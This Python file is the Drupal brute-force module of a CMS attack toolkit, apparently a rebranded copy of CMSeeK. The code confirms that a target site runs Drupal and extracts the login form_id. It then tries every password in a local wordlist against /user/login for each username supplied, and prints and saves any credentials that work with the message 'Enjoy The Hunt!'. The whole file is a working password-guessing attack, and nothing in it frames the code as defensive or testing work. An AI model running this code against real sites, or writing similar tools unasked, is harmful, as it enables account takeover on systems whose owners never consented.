#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This is a part of CieMeS, check the LICENSE file for more information
# Rex4 - Cantix Crew
### Drupal Bruteforce module

import ciemesdb.basic as ciemes # I don't feel like commenting
import ciemesdb.sc as source # Contains function to detect cms from source code
import ciemesdb.header as header # Contains function to detect CMS from gathered http headers
import multiprocessing ## Let's speed things up a lil bit (actually a hell lot faster) shell we?
from functools import partial ## needed somewhere :/
import sys
import requests
import re
import cmseekdb.generator as generator


def testlogin(url,user,passw,formid):

    if url.endswith('/'):
        loginUrl = url + 'user/login/'
        redirect = url + 'user/1/'
    else:
        loginUrl = url + '/user/login/'
        redirect = url + '/user/1/'

    post = { 'name': user, 'pass': passw, 'form_id': formid, 'op': 'Log in', 'location': redirect }
    session = requests.Session()
    response = session.post(loginUrl, data=post)
    return response.url

def start():
    ciemes.clearscreen()
    ciemes.banner("Drupal Bruteforce Module")
    url = ciemes.targetinp("") # input('Enter Url: ')
    ciemes.info("Checking for Drupal")
    bsrc = ciemes.getsource(url, ciemes.randomua('onceuponatime'))
    if bsrc[0] != '1':
        ciemes.error("Could not get target source, CMSeek is quitting")
        ciemes.handle_quit()
    else:
        ## Parse generator meta tag
        parse_generator = generator.parse(bsrc[1])
        ga = parse_generator[0]
        ga_content = parse_generator[1]

        try1 = generator.scan(ga_content)
        if try1[0] == '1' and try1[1] == 'dru':
            drucnf = '1'
        else:
            try2 = source.check(bsrc[1], url) # Confirming Drupal using other source code checks
            if try2[0] == '1' and try2[1] == 'dru':
                drucnf = '1'
            else:
                try3 = header.check(bsrc[2]) # Headers Check!
                if try3[0] == '1' and try3[1] == 'dru':
                    drucnf = '1'
                else:
                    drucnf = '0'
    if drucnf != '1':
        ciemes.error('Could not confirm Drupal... CMSeek is quitting')
        ciemes.handle_quit()
    else:
        ciemes.success("Drupal Confirmed... Checking for Drupal login form")
        druloginsrc = ciemes.getsource(url + '/user/login/', ciemes.randomua('therelivedaguynamedkakashi'))
        if druloginsrc[0] == '1' and '<form' in druloginsrc[1] and 'name="form_id" value="' in druloginsrc[1]:
            ciemes.success("Login form found! Retriving form id value")
            fid = re.findall(r'name="form_id" value="(.*?)"', druloginsrc[1])
            if fid == []:
                ciemes.error("Could not find form_id, CMSeeK is quitting!")
                ciemes.handle_quit()
            else:
                ciemes.success('form_id found: ' + ciemes.bold + fid[0] + ciemes.cln)
                form_id = fid[0]
            druparamuser = ['']
            rawuser = input("[~] Enter Usernames with coma as separation without any space (example: cris,harry): ").split(',')
            for rusr in rawuser:
                druparamuser.append(rusr)
            drubruteusers = set(druparamuser) ## Strip duplicate usernames

            for user in drubruteusers:
                if user != '':
                    print('\n')
                    ciemes.info("Bruteforcing User: " + ciemes.bold + user + ciemes.cln)
                    pwd_file = open("wordlist/passwords.txt", "r")
                    passwords = pwd_file.read().split('\n')
                    passwords.insert(0, user)
                    passfound = '0'
                    for password in passwords:
                        if password != '' and password != '\n':
                            sys.stdout.write('[*] Testing Password: ')
                            sys.stdout.write('%s\r\r' % password)
                            sys.stdout.flush()
                            cursrc = testlogin(url, user, password, form_id)
                            # print(cursrc)
                            if '/user/login/' in str(cursrc):
                                continue
                            else:
                                ciemes.success('Password found! \n\n\n')
                                # print (cursrc)
                                ciemes.success('Password found!')
                                print(" |\n |--[username]--> " + ciemes.bold + user + ciemes.cln + "\n |\n |--[password]--> " + ciemes.bold + password + ciemes.cln + "\n |")
                                ciemes.success('Enjoy The Hunt!')
                                ciemes.savebrute(url,url + '/user/login',user,password)
                                passfound = '1'
                                break
                            break
                    if passfound == '0':
                        ciemes.error('\n\nCould Not find Password!')
                    print('\n\n')

        else:
            ciemes.error("Couldn't find login form... CMSeeK is quitting")
            ciemes.handle_quit()
